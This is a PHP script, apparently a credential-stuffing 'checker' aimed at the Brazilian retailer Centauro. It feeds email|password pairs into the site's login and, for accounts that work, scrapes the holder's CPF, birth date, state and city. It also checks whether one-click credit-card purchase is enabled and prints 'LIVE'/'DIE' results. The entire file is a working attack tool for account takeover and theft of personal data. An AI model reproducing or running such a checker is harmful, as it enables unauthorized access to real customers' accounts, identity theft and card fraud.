
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];


        $a = new cURL();

        $b = $a->post('https://checkout.centauro.com.br/slogin','ReturnUrl=%2Fminha-conta%2Fcadastro&Login='.$email.'&Cadastro=false&Cep=&Senha='.$senha.'');

        $c = $a->get('https://www.centauro.com.br/minha-conta/one-click-buy');
        $c2 = $a->get('https://www.centauro.com.br/minha-conta/cadastro');

$x = $a->get("https://m2.centauro.com.br//scooby/clientesMobile/ObterClienteCartoes");


        if (strpos($c, 'Cartão de Crédito')) { 

 
 $one = "Ativado!";
  

        }else{

         $one = "Desativado!";
   

}


      

if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (strpos($b, 'Dados pessoais')) { 

            $cpf = getStr($c2,'<input class="form-field simple cpf" name="cpf" id="fisica-cpf" type="text" value="','" maxlength="14" />');
            $data = getStr($c2,'<input class="form-field simple data required" name="datadenascimento" id="fisica-data-de-nascimento" type="text" value="','" maxlength="10" />');

            $estado = getStr($c2,'<option value="BA" selected>','</option>');
            if($estado == ""){ $estado = "N/A"; }
            $city = getStr($c2,'<input class="form-field simple city required" name="cidade" id="fisica-cidade" type="text" maxlength="100" value="','" />');
if($city == ""){ $city = "N/A"; }

 echo "LIVE → $email|$senha | OneClick: $one | CPF: $cpf | Data de nascimento: $data | Estado: $estado | Cidade: $city #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
